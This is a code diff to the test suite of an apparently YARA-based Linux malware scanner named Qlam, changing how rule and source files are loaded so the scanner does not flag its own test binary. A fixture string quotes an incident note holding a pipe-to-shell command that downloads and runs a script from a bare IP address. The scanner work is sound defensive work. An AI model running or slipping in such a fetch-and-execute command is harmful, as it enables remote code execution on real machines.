@@ -274,6 +274,10 @@ rule Linux_Hacktool_Socat { condition: elf.type == elf.ET_EXEC }
         );
     }
 
+    fn source(rel: &str) -> String {
+        std::fs::read_to_string(Path::new(env!("CARGO_MANIFEST_DIR")).join(rel)).unwrap()
+    }
+
     /// Text that only mentions what the rules look for — Qlam's own rules and
     /// sources (found in a real home scan, 2026-09-30), notes, docs — must
     /// never be flagged.
@@ -281,8 +285,11 @@ rule Linux_Hacktool_Socat { condition: elf.type == elf.ET_EXEC }
     fn bundled_rules_ignore_text_that_quotes_them() {
         let r = bundled();
         for (what, data) in [
-            ("the rule file itself", include_str!("../../rules/qlam-linux.yar").to_string()),
-            ("persistence.rs", include_str!("../persistence.rs").to_string()),
+            // Read at run time, not include_str!: embedding the rule text
+            // would put the strings the rules look for into Qlam's own test
+            // binary, which on-access scanning then flags while it's built.
+            ("the rule file itself", source("rules/qlam-linux.yar")),
+            ("persistence.rs", source("src/persistence.rs")),
             ("a note", format!("# Incident notes\nThe attacker ran:\n{DROPPER}\ncurl -s http://1.2.3.4/a.sh | sh\n")),
         ] {
             assert!(r.scan(data.as_bytes()).is_none(), "{what} was flagged");
